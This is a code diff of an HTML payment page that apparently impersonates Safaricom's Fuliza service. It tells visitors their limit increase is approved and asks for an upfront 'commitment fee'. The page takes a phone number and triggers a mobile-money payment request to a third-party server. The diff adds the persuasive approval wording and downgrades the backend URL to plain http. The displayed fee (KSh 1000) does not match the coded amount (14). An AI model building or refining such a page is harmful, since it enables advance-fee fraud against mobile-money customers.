@@ -1,8 +1,10 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Commitment Fee Payment</title><style>
+<title>Commitment Fee Payment</title>
+<style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
 
@@ -54,11 +56,19 @@ border-top:1px solid rgba(255,255,255,.25);
 .invoice-amount{font-size:48px;font-weight:800;}
 .invoice-label{font-size:12px;}
 
+.instructions{
+margin-top:16px;
+font-size:14px;
+color:#555;
+line-height:1.5;
+}
+
 .pay-section{
 background:#fff;
 border-radius:16px;
 box-shadow:0 8px 30px rgba(0,0,0,.1);
 padding:24px;
+margin-top:20px;
 }
 
 .phone-wrap{
@@ -189,41 +199,72 @@ border-radius:30px;
 font-weight:600;
 cursor:pointer;
 }
-</style></head><body><header class="top-bar">Safaricom Fuliza Verification</header><div class="page-wrap"><div class="step-badge">
+</style>
+</head>
+<body>
+
+<header class="top-bar">Safaricom Fuliza Verification</header>
+
+<div class="page-wrap">
+
+<div class="step-badge">
 <div class="step-dot">3</div>
 <div class="step-line"></div>
 <div class="step-label">Customer Commitment Fee</div>
-</div><div class="invoice-card">
+</div>
+
+<div class="invoice-card">
 <div class="invoice-header">
 <div class="invoice-title">Commitment Fee Invoice</div>
-<div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit"></span></span></div><div class="invoice-amount-row">
+<div class="invoice-limit">Selected Fuliza Limit: <span id="limit"></span></div>
+<div class="invoice-amount-row">
 <div class="invoice-currency">KSh</div>
 <div class="invoice-amount">1000</div>
 <div class="invoice-label">Amount Due</div>
 </div>
 </div>
-</div><div class="pay-section"><div class="phone-wrap">
+</div>
+
+<div class="instructions">
+<p>Dear Customer, your Fuliza limit increase request has been approved. To finalize the upgrade, please complete the <strong>Customer Commitment Fee</strong> below. This confirms your request and allows our system to <strong>automatically refresh your current limit to the new limit you selected</strong>.</p>
+<p>Complete this step to proceed to the <strong>final Fuliza limit activation stage</strong>. Once completed, your upgraded limit will be processed immediately.</p>
+</div>
+
+<div class="pay-section">
+<div class="phone-wrap">
 <span class="phone-prefix">254</span>
 <input class="phone-input" id="phone" placeholder="7XXXXXXXX">
-</div><button class="pay-btn" onclick="payNow()">Pay Commitment Fee</button>
+</div>
+
+<button class="pay-btn" onclick="payNow()">Pay KSh 1000 Now</button>
 
 <div class="spinner" id="spinner">
 <div class="loader"></div>
-</div><div class="status-msg" id="statusMsg"></div></div>
-</div><div class="overlay" id="successOverlay">
+</div>
+
+<div class="status-msg" id="statusMsg"></div>
+</div>
+
+</div>
+
+<div class="overlay" id="successOverlay">
 <div class="popup">
 <div class="popup-header success">
 <div class="popup-icon">✅</div>
 <div class="popup-title">Payment Successful</div>
-</div><div class="receipt-body">
+</div>
+<div class="receipt-body">
 <div class="receipt-row"><span>Amount</span><span>KSh 1000</span></div>
 <div class="receipt-row"><span>Status</span><span>Completed</span></div>
-</div><div class="popup-actions">
+</div>
+<div class="popup-actions">
 <button class="btn-proceed" onclick="goNext()">Continue</button>
-</div></div>
-</div><script>
+</div>
+</div>
+</div>
 
-const BACKEND="https://mpayafrica-server.onrender.com";
+<script>
+const BACKEND="http://mpayafrica-server.onrender.com";
 
 const selectedAmount=localStorage.getItem("selectedAmount")||"—";
 document.getElementById("limit").innerText=selectedAmount;
@@ -231,7 +272,6 @@ document.getElementById("limit").innerText=selectedAmount;
 const COMMITMENT_FEE=14;
 
 async function payNow(){
-
 const phone=document.getElementById("phone").value.trim();
 const status=document.getElementById("statusMsg");
 const spinner=document.getElementById("spinner");
@@ -246,85 +286,76 @@ return;
 const fullPhone="254"+phone;
 
 spinner.style.display="flex";
+status.style.display="none";
 
 let data;
 
 try{
-
-const res=await fetch(BACKEND+"/api/stk-push",{
+const res=await fetch(BACKEND+"/pay",{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
+phone:fullPhone,
 amount:COMMITMENT_FEE,
-phone_number:fullPhone,
-user_reference:"Fuliza Commitment Fee",
-payment_id:"wallet"
+account:"Commitment Fee"
 })
 });
-
 data=await res.json();
-
 }catch(err){
-
 spinner.style.display="none";
 status.style.display="block";
 status.className="status-msg error";
-status.innerText="Network error. Try again.";
+status.innerText="Server error. Try again.";
 return;
-
 }
 
 if(!data.success){
-
 spinner.style.display="none";
 status.style.display="block";
 status.className="status-msg error";
 status.innerText="Payment initiation failed.";
 return;
-
 }
 
-startPolling(data.checkoutRequestId);
-
+startPolling(data.reference || data.receipt.reference);
 }
 
-function startPolling(id){
-
+function startPolling(reference){
 let attempts=0;
-
 const interval=setInterval(async()=>{
-
 attempts++;
-
-if(attempts>40){
+if(attempts>20){
 clearInterval(interval);
+document.getElementById("spinner").style.display="none";
+document.getElementById("statusMsg").style.display="block";
+document.getElementById("statusMsg").className="status-msg error";
+document.getElementById("statusMsg").innerText="Payment timeout. Please retry.";
 return;
 }
-
 try{
-
-const res=await fetch(BACKEND+"/receipt/"+id);
+const res=await fetch(BACKEND+"/receipt/"+reference);
 const data=await res.json();
-
-if(data.status==="success"){
-
+if(data.success && data.receipt){
+const status=data.receipt.status.toLowerCase();
+if(status==="processing" || status==="loan_released"){
 clearInterval(interval);
 document.getElementById("spinner").style.display="none";
 document.getElementById("successOverlay").classList.add("show");
-
 }
-
+if(status==="cancelled" || status==="stk_failed" || status==="error"){
+clearInterval(interval);
+document.getElementById("spinner").style.display="none";
+document.getElementById("statusMsg").style.display="block";
+document.getElementById("statusMsg").className="status-msg error";
+document.getElementById("statusMsg").innerText="Payment failed: "+data.receipt.status_note;
+}
+}
 }catch(e){}
-
 },3000);
-
 }
 
-function goNext(){
+function goNext(){window.location.href="payment4.html";}
+</script>
 
-window.location.href="payment4.html";
-
-}
-
-</script></body>
+</body>
 </html>
